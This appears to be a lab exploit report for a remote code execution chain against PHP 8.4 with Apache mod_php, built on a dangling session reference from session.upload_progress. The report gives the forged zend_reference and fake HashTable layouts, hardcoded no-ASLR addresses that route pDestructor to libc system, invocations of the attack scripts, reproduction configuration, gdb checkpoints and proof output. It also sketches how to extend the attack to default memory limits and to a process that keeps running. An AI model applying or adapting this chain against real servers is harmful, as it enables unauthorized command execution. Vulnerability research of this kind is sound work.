# No-ASLR RCE report with pure HTTP and no target-side PHP

Date: 2026-10-21
Target: PHP 8.4.26 + Apache 2.4.68 prefork + mod_php (Debian 12 amd64 remote lab)
Constraint: **fully remote, HTTP only; do not write any target-specific PHP file into the target webroot**. The target page is a plain
`index.php`:

```php
<?php
echo "OK\n";
```

This report covers **no-ASLR** results only. For the analysis of the two ASLR paths, see `ASLR_PATHS.md`.

---

## 1. Conclusion

On the lab worker with ASLR disabled, RCE was achieved with **two pure HTTP requests**:

- Request A: decoding a large session via `session.upload_progress` triggers OOM, leaving a cross-request dangling
  `PS(http_session_vars)` zend_reference.
- Request B: a 56-byte raw buffer allocated and freed for a multipart field reclaims the chunk that held the old reference,
  overwriting the old 32-byte reference with a forged `zend_reference`; at the same time, a **live**
  192-byte zend_string carries the fake HashTable. B's END cleanup calls
  `php_session_track_init()` → `zval_ptr_dtor` → `zend_array_destroy` →
  `zend_hash_destroy`, and `pDestructor` lands on libc `system`.

Observed execution:

```text
system("id>/tmp/p1")
```

proof (`/tmp/p1`, 54 bytes):

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Key gdb backtrace:

```text
#0  __libc_system (line=0x7ffff5e6e118 "id>/tmp/p1")
#1  zend_hash_destroy (ht=0x7ffff5e6e0d8)
#2  zend_array_destroy (ht=0x7ffff5e6e0d8)
#3  i_zval_ptr_dtor (zval_ptr=0x7ffff5e02328)
#4  zend_reference_destroy (ref=0x7ffff5e02320)
#5  php_session_track_init ()
#6  php_session_initialize ()
#7  php_session_rfc1867_cleanup ()
#8  php_session_rfc1867_callback ()
```

After `system` returns, the request aborts in Zend MM (`zend_mm_realloc_heap` detects heap corruption),
but the command has already executed and written the proof before the abort. The worker then crashes, as expected for a one-shot exploit.

---

## 2. Root cause and trigger point

- Vulnerability location: the upload-progress path in `ext/session/session.c`.
- During `php_request_startup`, request A triggers OOM while decoding a large session through
  `session.upload_progress`; after the bailout, `modules_activated=0`, so the session RSHUTDOWN is skipped.
- Residual state: `PS(http_session_vars)` is a **zend_reference** whose `val.value`
  points to the session HashTable allocated in A; after A finishes, that reference is still accessed by B's
  `php_session_track_init()`.
- B's END cleanup calls `php_session_initialize()` → `php_session_track_init()`:
  1. `zend_delete_global_variable("_SESSION")` decrements the reference refcount from 2 to 1;
  2. `zval_ptr_dtor(&PS(http_session_vars))` sees refcount 1 and calls
     `zend_reference_destroy()`;
  3. `zend_reference_destroy()` calls `zend_array_destroy()` on `ref->val` (which we forged as IS_ARRAY);
  4. the fake HashTable's `pDestructor = system`, so `zend_hash_destroy()` calls `system()` with
     `&bucket->val` (the address of the command string).

The entire trigger completes before application code executes; the application does not need to call any session API.

---

## 3. Request B memory layout

Stable addresses under no-ASLR:

| Object | Address/offset |
|---|---|
| Old zend_reference (dangling) R0 | `0x7ffff5e02320` |
| Start of the 56B raw buffer that reclaims R0 | `R0-0x10` |
| data of the 192B zend_string holding the fake HashTable | `0x7ffff5e6e0d8` (T+0x18) |
| libc `system` | `0x7ffff7d13490` |
| libphp base (reference) | `0x7ffff47c0000` |

### 3.1 Raw buffer reclaiming the old reference

Multipart normal-field values are first read by `multipart_buffer_read_body()` into a
**raw buffer** from `erealloc(NULL, len+1)`; content starts at offset 0, and the buffer is only
`efree()`d after callbacks/registration; the content remains after free. Field value length 55 is chosen (allocates 56B, Zend MM bin 6).

In B, 7 priming fields with "31-character field name + L=47" consume 56B key slots, so the raw buffer of the subsequent
L=55 field lands exactly at `0x7ffff5e02310` (R0-0x10). The 56 bytes of that chunk cover the
R0 region of the old 32B reference:

```text
raw+0x10 (R0+0x00): gc: refcount=1, type=IS_REFERENCE (10)
raw+0x18 (R0+0x08): val.value = fake HashTable data address
raw+0x20 (R0+0x10): val.type  = 0x307 (IS_ARRAY_EX)
raw+0x28 (R0+0x18): zend_reference.sources = 0
```

`zend_reference_destroy()` requires `sources.ptr == NULL`; otherwise the release build's
`ZEND_ASSUME` causes `__builtin_unreachable`/abort.

### 3.2 Live string carrying the fake HashTable

A freed raw buffer cannot carry the fake HashTable: after free, the allocator writes
`next_free_slot` at chunk offset 0, overwriting the fake HashTable's `gc`, so the
`GC_DELREF` in `i_zval_ptr_dtor` never reaches zero and the array dtor is not entered.

Use a **live zend_string** instead:

- Field value length 167 → `zend_string_alloc` size 24+167+1=192, exactly bin 13 (192B).
- The string stays in `$_POST` until request shutdown; it is still live at B's END cleanup.
- The string data starts at chunk start +24, and its content is fully controlled by the field value.
- The fake HashTable is placed directly at data offset 0:

```text
data+0x00: gc refcount=1, type=IS_ARRAY (7)
data+0x08: flags=HASH_FLAG_STATIC_KEYS(16), nTableMask=0xfffffff8
data+0x10: arData = data+0x40
data+0x18: nNumUsed=1, nNumOfElements=1
data+0x20: nTableSize=8, nInternalPointer=0
data+0x28: nNextFreeElement=0
data+0x30: pDestructor = system
data+0x40: "id>/tmp/p1\0"
data+0x60: marker 0x1122334455667788 (debug only)
```

`zend_hash_destroy()` takes the `HT_HAS_STATIC_KEYS_ONLY` + `HT_IS_WITHOUT_HOLES`
branch and calls `pDestructor(&p->val)`, i.e. `system(data+0x40)`.

---

## 4. Reproduction steps

Environment:

- Apache prefork with a single worker, started with no-ASLR:
  `setarch $(uname -m) -R /usr/sbin/apache2ctl -k start`
- PHP configuration: `memory_limit=8M`, `session.upload_progress.cleanup=On`,
  `session.upload_progress.enabled=On`, `session.save_path=/tmp`,
  `session.use_strict_mode=0`, `display_errors=On`.
- webroot contains only a plain `index.php` (`echo "OK\n"`, no session calls).

Request A (same-directory tool `send_a_ps.py`):

```bash
python3 send_a_ps.py 17 19 3 12
# boundary 17B, PHPSESSID 19B, progress key 3B, large field 12MB
```

A's purpose: OOM while decoding upload-progress, leaving a cross-request dangling reference.
After A finishes, the worker can still handle B (in this lab the session RSHUTDOWN is skipped).

Request B (`send_b_rce2.py`):

```bash
python3 send_b_rce2.py \
  7 2 0x7ffff5e6e0d8 0x7ffff7d13490 "id>/tmp/p1"
# N1=7 priming fields; N2=2 L=55 fake-ref fields
# HTDATA=fake HashTable data address; SYS=system address
```

B's multipart:

- `PHPSESSID=attacksessionid0001`
- `PHP_SESSION_UPLOAD_PROGRESS=pwn`
- 7 × 31-character field names (`a000...`), value = 167B fake HashTable
- 2 × short field names (`f00`,`f01`), value = 55B fake reference
- boundary = `B`×10, properly closed at the end

Check:

```bash
cat /tmp/p1
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 4.1 Key gdb observation points

```gdb
b php_session_track_init
# print ps_globals.http_session_vars.value.ptr and the fake reference it points to
b zend_reference_destroy if $rdi == 0x7ffff5e02320
b zend_array_destroy   if $rdi == 0x7ffff5e6e0d8
b zend_hash_destroy    if $rdi == 0x7ffff5e6e0d8
b system
```

Actual hits:

```text
REF rdi=0x7ffff5e02320
ARR T  ht=0x7ffff5e6e0d8
HASH T ht=0x7ffff5e6e0d8
SYSTEM rdi=0x7ffff5e6e118 [id>/tmp/p1]
```

---

## 5. Tools and files

| File | Purpose |
|---|---|
| `tools/send_a_ps.py` | A: upload-progress large-field OOM, leaving a dangling reference |
| `tools/send_b_align.py` | Field length/count alignment experiments for B (finding where the 56B raw buffer lands) |
| `tools/send_b_rce2.py` | Final B: fake reference + live-string fake HashTable + system |
| `tools/send_b_rce.py` | Early version (fake HT in a freed raw buffer; gc is overwritten by the free-list, unusable) |
| `logs/noaslr_rce.log` | gdb/system/proof record of the successful run |

---

## 6. Limitations and boundaries

1. **No-ASLR only**: R0, fake HT data, and system addresses are all hardcoded. With ASLR enabled, the addresses change.
2. **memory_limit**: This lab uses 8M to make A OOM easily. With the default `memory_limit=128M`,
   A must construct more than 128M of session data (feasible but high traffic); `session.upload_progress`
   is enabled by default and cleanup defaults to On.
3. **Worker aborts after request B**: after `system` returns, `pefree(HT_GET_DATA_ADDR)` in
   `zend_hash_destroy` frees the string's interior pointer, Zend MM detects heap corruption and
   aborts. The proof has already been written; to continue exploiting the same process, the fake HT must be placed in a legally freeable
   allocation chunk or nTableMask must be fixed so that `HT_GET_DATA_ADDR` is the allocation start.
4. **Depends on B's exact 56B/192B allocation order**: N1=7, field-name length 31, L=167/L=55,
   boundary 10 are the measured combination; a different PHP build/configuration/request order requires recalibration.
5. **No application code involved**: the target page needs no session calls; the trigger is in the RINIT/parse stage.
